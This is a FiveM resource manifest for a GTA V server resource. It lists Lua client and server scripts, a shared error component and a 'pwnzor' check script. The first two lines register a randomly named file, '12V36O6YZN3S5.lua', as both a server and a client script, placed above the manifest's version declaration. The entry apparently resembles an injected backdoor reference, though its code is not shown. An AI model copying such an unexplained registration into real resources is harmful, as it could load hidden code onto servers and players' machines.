server_script "12V36O6YZN3S5.lua"
client_script "12V36O6YZN3S5.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")

client_scripts({
	"client/**/*.lua",
})

server_scripts({
	"server/**/*.lua",
})
